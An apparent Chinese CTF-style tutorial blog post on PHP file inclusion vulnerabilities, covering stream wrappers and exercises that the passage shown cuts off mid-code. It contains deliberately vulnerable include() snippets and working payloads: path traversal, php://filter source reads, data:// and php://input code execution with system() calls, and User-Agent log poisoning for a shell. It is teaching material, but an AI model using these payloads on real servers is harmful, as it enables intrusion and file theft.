{"title":"浅析文件包含","uid":"778d53d2750c08bc5c3164d03f2d66cf","slug":"浅析文件包含","date":"2022-06-18T09:25:28.000Z","updated":"2024-02-14T07:55:42.000Z","comments":true,"path":"api/articles/浅析文件包含.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141555978.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>近期发现文件包含这方面几乎一窍不通，特来对此漏洞进行学习，并总结如下，希望能对正在学习文件包含的人有些许帮助。</p>\n<h1 id=\"漏洞相关信息\"><a href=\"#漏洞相关信息\" class=\"headerlink\" title=\"漏洞相关信息\"></a>漏洞相关信息</h1><h2 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就\n被称为文件包含。文件包含的存在使得开发变得更加灵活和方便，但同时也带了安全问题，导致客户端\n可以远程调用文件，造成文件包含漏洞。这个漏洞在php中十分常见，其他语言也有。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">文件包含漏洞可能带来的危害有：\n1、web服务器的文件被外界浏览，导致信息泄露；\n2、脚本被任意执行，导致网站被篡改。文件包含漏洞是一种常见的依赖于脚本运行而影响web应用程序\n的漏洞。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"漏洞分类\"><a href=\"#漏洞分类\" class=\"headerlink\" title=\"漏洞分类\"></a>漏洞分类</h2><p>1.本地文件包含漏洞<br>本地的话简单理解就是网页本身存在着恶意文件，我们对其进行调用，从而获取信息等</p>\n<p>2.远程文件包含漏洞（需要php.ini开启了allow_url_fopen和allow_url_include）<br>远程简单理解就是网页本身不存在恶意文件，我们取别的地方的文件包含进去，包含的文件是第三方服务器的文件。</p>\n<h2 id=\"漏洞常用函数\"><a href=\"#漏洞常用函数\" class=\"headerlink\" title=\"漏洞常用函数\"></a>漏洞常用函数</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">主流文件包含php一些函数的含义：\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>执行到<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>才包含文件，找不到包含文件只产生警告，还会接着运行后面的脚本\n\n<span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> 只要程序一运行就会包含文件，找不到包含文件则会报错，并且脚本终止运行\n\n<span class=\"token keyword\">include_once</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>执行到<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>才包含文件，找不到包含文件只产生警告，还会接着运行后面的脚本\n<span class=\"token function\">_once</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>后缀表明只会包含一次，已包含则不会再包含\n<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：只要程序一运行就会包含文件，找不到包含文件则会报错，并且脚本终止运行\n<span class=\"token function\">_once</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>后缀表明只会包含一次，已包含则不会再包含\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"利用方法\"><a href=\"#利用方法\" class=\"headerlink\" title=\"利用方法\"></a>利用方法</h1><p>最常用的是伪协议</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">file:// 协议：\n        条件 allow_url_fopen:off/on  allow_url_include :off/on\n        作用：用于访问本地文件系统。在include()/require()等参数可控的情况下\n             如果导入非php文件也会被解析为php\n        用法：\n            1.file://[文件的绝对路径和文件名]\n            2.[文件的相对路径和文件名]\n            3.[http：//网络路径和文件名]\n\nphp:// 协议：\n        常见形式：php://input php://stdin php://memory php://temp\n        条件 allow_url_include需要 on allow_url_fopen:off/on\n        作用：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter\n            和php://input，php://filter用于读取源码，php://input用于执行php代码\n        php://filter参数详解：resource=（必选，指定了你要筛选过滤的数据流）     \n        read=（可选）    write=（可选）\n        对read和write，可选过滤器有string.rot13、string.toupper\n        、string.tolower、string.strip_tags、convert.base64-encode \n        &amp; convert.base64-decode\n         用法举例：php://filter/read=convert.base64-encode/resource=flag.php\n                    网址+?page=php://filter/convert.base64-encode/resource=文件名\n\nzip:// bzip2:// zlib:// 协议：\n        条件：allow_url_fopen:off/on      allow_url_include :off/on\n        作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件\n            更重要的是不需要指定后缀名\n        用法：zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]\n             compress.bzip2://file.bz2\n             compress.zlib://file.gz\n        其中phar://和zip://类似\n\ndata:// 协议：\n        条件：allow_url_fopen:on    allow_url_include :on\n        作用：可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。\n        用法：data://text/plain,            data://text/plain;base64,\n        举例：data://text/plain,<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>php<span class=\"token operator\">%</span><span class=\"token number\">20</span>phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n             data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其次还有条件竞争</p>\n<p>条件竞争就是两个或者多个进程或者线程同时处理一个资源（全局变量，文件）产生非预想的执行效果，从而产生程序执行流的改变，从而达到攻击的目的。</p>\n<p>条件竞争需要如下的条件：</p>\n<pre><code>并发，即至少存在两个并发执行流。这里的执行流包括线程，进程，任务等级别的执行流。\n共享对象，即多个并发流会访问同一对象。常见的共享对象有共享内存，文件系统，信号。一般来说，这些共享对象是用来使得多个程序执行流相互交流。此外，我们称访问共享对象的代码为临界区。在正常写代码时，这部分应该加锁。\n改变对象，即至少有一个控制流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。\n</code></pre>\n<h1 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h1><h2 id=\"无限制本地包含实战\"><a href=\"#无限制本地包含实战\" class=\"headerlink\" title=\"无限制本地包含实战\"></a>无限制本地包含实战</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我将flag放到上一级目录下<br>此时我们访问网站<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553051.png\"><br>想要得到flag只需构造如下payload即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span>flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553093.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"有后缀的本地包含实战\"><a href=\"#有后缀的本地包含实战\" class=\"headerlink\" title=\"有后缀的本地包含实战\"></a>有后缀的本地包含实战</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span> <span class=\"token variable\">$file</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时我们可以发现代码强行给变量加了一个.php后缀，而我们的flag没有.php后缀，我们想要进行获取flag的话就不能够让.php发挥作用，因此我们此时可以通过以下几种方法来对其进行截断（ 需要 magic_quotes_gpc=off，PHP小于5.3.4）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">%</span><span class=\"token number\">00</span>截断\n\n路径长度截断\n<span class=\"token comment\"># Linux 需要文件名长于 4096，Windows 需要长于 256</span>\n\n点号截断\n<span class=\"token comment\"># 只适用 Windows，点号需要长于 256</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>具体如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553068.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"文件包含实战-简单\"><a href=\"#文件包含实战-简单\" class=\"headerlink\" title=\"文件包含实战(简单)\"></a>文件包含实战(简单)</h2><h3 id=\"0X01\"><a href=\"#0X01\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>构造payload如下即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"0X02\"><a href=\"#0X02\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>过滤了php，我们可以用data伪协议</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">?file=data://text/plain,<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span> <span class=\"token string backtick-quoted-string\">`tac f*`</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"0X03\"><a href=\"#0X03\" class=\"headerlink\" title=\"0X03\"></a>0X03</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>虽然过滤了php和data，但是并未过滤大小写呀，我们可以用大小写进行绕过<br>在这里我使用input伪协议，因为data伪协议需要<code>allow_url_fopen:on    allow_url_include :on</code><br>这里条件不满足，但是我不知道为什么filter在这里也无法使用，暂时保留疑问<br>在url后插入如下语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>Php<span class=\"token punctuation\">:</span><span class=\"token comment\">//input</span>\n<span class=\"token comment\">#记得要大写</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>然后在post中插入如下数据</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553120.png\" alt=\"在这里插入图片描述\"><br>发现flag在fl0g.php中，我们更改post内容即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tac fl0g.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553108.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X04\"><a href=\"#0X04\" class=\"headerlink\" title=\"0X04\"></a>0X04</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个的话我们可以利用data伪协议进行绕过，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>data<span class=\"token punctuation\">:</span><span class=\"token comment\">//text/plain;base64,PD89IGBjYXQgZioucGhwYDs/Pg</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553171.png\" alt=\"在这里插入图片描述\"><br>其实语句本来是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">本来是data<span class=\"token punctuation\">:</span><span class=\"token comment\">//text/plain;base64,PD89IGBjYXQgZioucGhwYDs/Pg==</span>\n但过滤了<span class=\"token operator\">=</span>，因此把<span class=\"token operator\">=</span>删去<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553605.png\" alt=\"在这里插入图片描述\"><br>把等号删去此时还有分号，有分号语句就可以执行，本地测试如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553714.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"文件包含（日志包含类）\"><a href=\"#文件包含（日志包含类）\" class=\"headerlink\" title=\"文件包含（日志包含类）\"></a>文件包含（日志包含类）</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"0X01-1\"><a href=\"#0X01-1\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。  利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>知道服务器的日志位置，我们可以去包含这个文件从而拿到shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">apache一般是<span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>apache<span class=\"token operator\">/</span>access<span class=\"token operator\">.</span>log。\nnginx的log在<span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>nginx<span class=\"token operator\">/</span>access<span class=\"token operator\">.</span>log和<span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>nginx<span class=\"token operator\">/</span>error<span class=\"token operator\">.</span>log<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>我们试着访问日志文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>nginx<span class=\"token operator\">/</span>access<span class=\"token operator\">.</span>log<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553789.png\" alt=\"在这里插入图片描述\"><br>成功访问到了，我们发现user-agent的信息出来了，因此我们可以利用user-agent植入语句从而获取flag，具体操作如下<br>开启bp，修改get信息为日志路径<code>?file=/var/log/nginx/access.log</code>，修改ua为<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>,执行结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553854.png\" alt=\"在这里插入图片描述\"><br>发现flag在fl0g.php中，此时我们修改ua为<code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code>，执行结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553132.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X02-1\"><a href=\"#0X02-1\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> 